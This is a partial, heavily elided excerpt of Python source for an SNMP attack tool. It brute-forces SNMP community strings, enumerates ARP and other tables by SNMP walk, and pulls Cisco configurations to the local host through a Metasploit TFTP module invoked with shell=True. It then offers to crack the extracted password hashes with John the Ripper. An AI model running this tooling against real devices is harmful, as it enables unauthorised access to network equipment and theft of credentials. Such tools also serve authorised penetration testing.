...
class SNMPBruteForcer(object):
    ...
    def guess(self, communities):
        ...
        for c in communities:
            ...
            p.PDU.id = i
            p.community = c
            self.s.sendto(bytes(p), self.addr)
            sleep(1/self.rate)
        while True:
            try:
...
def generic_snmpwalk(snmpwalk_args,oids):
    for key, val in list(oids.items()):
        try:
...
def enumerateSNMPWalk(result,options):
    ...
    ############################################################### 	Enumerate Arp
    print('\n')
    for key, val in list(ARPOIDS.items()):
        try:
    ...
    for key, val in list(snmpstat_args.items()):
        try:
            printout(('################## Enumerating %s Table using: %s (%s)'%(key,val[0],val[1])),YELLOW)
...
def get_cisco_config(result,options):
    ...
    p=Popen(
        'msfcli auxiliary/scanner/snmp/cisco_config_tftp RHOSTS='+str(result.addr[0])+' LHOST='+str(Local_ip)+' COMMUNITY="'+result.community+'" OUTPUTDIR=./output RETRIES=1 RPORT='+str(result.addr[1])+' THREADS=5 VERSION='+result.version.replace('v','')+' E ',
        shell=True,
        stdin=PIPE,
        stdout=PIPE,
        stderr=PIPE,
    ...
    if encrypted:
        ...
        if not get_input("(Y/n):",'n',options):
            ...
            p = Popen('john ./hashes', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True, encoding='utf-8', errors='replace')
            while p.poll() is None:
                line = p.stdout.readline()
                print('\t' + line.strip())
...
def main():
    ...
    if options.stdin:
        ...
        print("Trying %d community strings ..." % len(communities), file=sys.stderr)
